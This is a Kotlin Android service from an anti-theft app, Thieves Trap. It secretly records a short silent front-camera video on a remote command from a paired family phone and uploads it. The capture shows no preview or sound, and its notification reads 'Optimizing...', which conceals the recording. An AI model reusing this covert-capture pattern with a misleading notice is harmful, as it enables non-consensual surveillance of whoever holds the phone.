package com.thievestrap

import android.app.*
import android.content.Context
import android.content.Intent
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.*
import android.util.Log
import android.util.Size
import androidx.core.app.NotificationCompat
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * v2.9.21: a short (6 s), SILENT front-camera video, triggered remotely by a paired family phone
 * ("Capture front video"). No audio track (MediaRecorder's audio source is never set), no shutter
 * sound, no preview shown. Low resolution and bitrate so the file stays well under the relay's size
 * limit (~650 KB raw) without any extra compression pass. Saved to the same app-private gallery
 * folder SelfieService uses, then handed to FamilyRelay for the encrypted upload.
 *
 * Modelled on SelfieService's camera handling (background thread, wake lock, hard timeout), but the
 * target surface is MediaRecorder's own Surface instead of an ImageReader.
 */
class VideoCaptureService : Service() {

    private val TAG = "TT-Video"
    private val NOTIF_ID = 12346
    private val CHANNEL_ID = "tt_selfie"            // same silent channel SelfieService already created
    private val DURATION_MS = 6_000L
    private val WIDTH = 480
    private val HEIGHT = 360

    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var recorder: MediaRecorder? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var wakeLock: PowerManager.WakeLock? = null
    private var outFile: File? = null
    private var isStopping = false
    private var recording = false

    override fun onBind(intent: Intent?) = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIF_ID, buildNotif())
        if (cameraDevice != null || recording) { Log.i(TAG, "capture already in progress"); return START_NOT_STICKY }
        isStopping = false
        acquireWakeLock()
        mainHandler.postDelayed({ if (!isStopping) safeStop() }, DURATION_MS + 15_000L)   // hard ceiling
        startBackgroundThread()
        backgroundHandler?.post { openCamera() }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isStopping = true
        cleanup()
        stopBackgroundThread()
        releaseWakeLock()
    }

    @Suppress("DEPRECATION")
    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ThievesTrap:VideoWakeLock")
            wakeLock?.acquire(DURATION_MS + 20_000L)
        } catch (e: Exception) { Log.e(TAG, "wake lock failed: ${e.message}") }
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (e: Exception) {}
        wakeLock = null
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("VideoThread_${System.currentTimeMillis()}").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        try { backgroundThread?.quitSafely(); backgroundThread?.join(500) } catch (e: Exception) {}
        backgroundThread = null; backgroundHandler = null
    }

    @Suppress("MissingPermission")
    private fun openCamera() {
        if (isStopping) return
        try {
            val manager = getSystemService(CAMERA_SERVICE) as CameraManager
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            } ?: manager.cameraIdList.firstOrNull() ?: run { safeStop(); return }

            outFile = File(galleryDir(), "clip_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.mp4")
            val rec = MediaRecorder()
            rec.setVideoSource(MediaRecorder.VideoSource.SURFACE)      // no setAudioSource(): the clip is silent by design
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            rec.setVideoEncodingBitRate(220_000)
            rec.setVideoFrameRate(15)
            rec.setVideoSize(WIDTH, HEIGHT)
            rec.setOutputFile(outFile!!.absolutePath)
            rec.prepare()
            recorder = rec

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    if (isStopping) { camera.close(); return }
                    cameraDevice = camera
                    createSession(camera)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); cameraDevice = null; if (!isStopping) safeStop() }
                override fun onError(camera: CameraDevice, error: Int) { Log.e(TAG, "camera error $error"); camera.close(); cameraDevice = null; safeStop() }
            }, backgroundHandler)
        } catch (e: Exception) { Log.e(TAG, "openCamera: ${e.message}"); safeStop() }
    }

    private fun createSession(camera: CameraDevice) {
        if (isStopping) return
        try {
            val surface = recorder?.surface ?: run { safeStop(); return }
            camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(s: CameraCaptureSession) {
                    if (isStopping) { s.close(); return }
                    session = s
                    try {
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                        req.addTarget(surface)
                        s.setRepeatingRequest(req.build(), null, backgroundHandler)
                        recorder?.start()
                        recording = true
                        mainHandler.postDelayed({ if (!isStopping) safeStop() }, DURATION_MS)
                    } catch (e: Exception) { Log.e(TAG, "start recording failed: ${e.message}"); safeStop() }
                }
                override fun onConfigureFailed(s: CameraCaptureSession) { safeStop() }
            }, backgroundHandler)
        } catch (e: Exception) { Log.e(TAG, "createSession: ${e.message}"); safeStop() }
    }

    private fun safeStop() {
        if (isStopping) return
        isStopping = true
        cleanup()
        val f = outFile
        if (f != null && f.exists() && f.length() > 0) {
            try { FamilyRelay.enqueueClip(applicationContext, f) } catch (e: Exception) { Log.w(TAG, "enqueue failed: ${e.message}") }
        } else {
            f?.delete()
        }
        stopSelf()
    }

    private fun cleanup() {
        try { if (recording) recorder?.stop() } catch (e: Exception) {}
        try { recorder?.reset(); recorder?.release() } catch (e: Exception) {}
        recorder = null; recording = false
        try { session?.close() } catch (e: Exception) {}
        session = null
        try { cameraDevice?.close() } catch (e: Exception) {}
        cameraDevice = null
    }

    private fun galleryDir(): File =
        File(getExternalFilesDir(android.os.Environment.DIRECTORY_PICTURES), "ThievesTrap").also { if (!it.exists()) it.mkdirs() }

    private fun buildNotif(): Notification {
        // Same channel SelfieService already creates ("tt_selfie", IMPORTANCE_LOW): one definition, two uses.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            if (nm.getNotificationChannel(CHANNEL_ID) == null)
                nm.createNotificationChannel(NotificationChannel(CHANNEL_ID, "Selfie Capture", NotificationManager.IMPORTANCE_LOW))
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Thieves Trap")
            .setContentText("Optimizing...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    companion object {
        fun start(context: Context) {
            androidx.core.content.ContextCompat.startForegroundService(context, Intent(context, VideoCaptureService::class.java))
        }
    }
}
